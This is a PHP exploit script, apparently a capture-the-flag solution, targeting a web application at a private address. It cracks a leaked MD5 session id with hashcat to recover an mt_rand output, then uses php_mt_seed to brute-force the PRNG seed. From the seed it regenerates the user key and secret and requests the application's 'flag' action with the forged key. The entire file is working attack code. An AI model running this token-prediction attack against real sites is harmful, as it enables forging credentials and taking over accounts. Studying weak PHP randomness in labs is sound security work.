<?php

function mylog($msg) {
    echo $msg;
}

function do_mt_srand($i) {
    mylog("client: mt_srand = ".$i."\n");
    mt_srand($i);
}

function do_mt_rand() {
    $ret = mt_rand();
    mylog("client: mt_rand = " . $ret . "\n");
    return $ret;
}

function rand_str($length = 32)
{
  $chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  $str = '';
  for ( $i = 0; $i < $length; $i++ )
  {
    $str .= $chars[mt_rand(0, strlen($chars) - 1) ];
  }
  return $str;
}

unlink("cookie.txt");

$base_url="http://10.105.42.5:8889/";

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Connection: Keep-Alive'));
curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
curl_setopt($ch, CURLOPT_TCP_KEEPALIVE, 1);
curl_setopt($ch, CURLOPT_TCP_KEEPIDLE, 300);
curl_setopt($ch, CURLOPT_TCP_KEEPINTVL, 20);
curl_setopt($ch, CURLOPT_URL, $base_url . "?action=get_user_Key"); // hashcat
$sid_content = curl_exec($ch);
echo 'server log:' . $sid_content . "\n";
$sid = substr($sid_content,-33,32);
echo $sid . "\n"; // hashcat to get id

$hashcat_cmd = 'hashcat --quiet -a 3 -m 0 ' . $sid . ' ?d?d?d?d?d?d?d?d?d?d -i -o ./abc.txt';
system($hashcat_cmd);

$fd = fopen("./abc.txt", "r");
$fcont = fgets($fd);
$rand_2 = substr($fcont, 33, -1);
echo $rand_2 . "\n";
fclose($fd);
unlink("./abc.txt");
curl_setopt($ch, CURLOPT_URL, $base_url);
curl_exec($ch);

$mt_seed_cmd = './php_mt_seed 0 0 0 0 '. $rand_2;
$pd = popen($mt_seed_cmd, "r");
while (!feof($pd)) {
	$pos_seed = fgets($pd);
	if ($pos_seed == '0') die('quited');
	echo "possible seed: " . $pos_seed . "\n";
	do_mt_srand(intval($pos_seed));
	$user_key_int = do_mt_rand();
	$user_key = md5($user_key_int);
	$id_int = do_mt_rand();
	$id = md5($id_int);
	$secret = rand_str();
	echo 'generated secret: '. $secret . "\n";
	/*curl_setopt($ch, CURLOPT_URL, $base_url . "?action=gdfm&key=".$user_key);
	$ret = curl_exec($ch);
	echo $ret . "\n";
	if (strpos($ret, "Succ") !== false) {
		break;
	}*/

	curl_setopt($ch, CURLOPT_URL, $base_url . "?action=flag&key=".$user_key."&secret_key=");
	echo curl_exec($ch) . "\n";
}

if ($id !== $sid) {
	echo "fatal error\nid=".$id."sid=".$sid."\n";
	die("go die\n");
}
curl_close($ch);
pclose($pd);
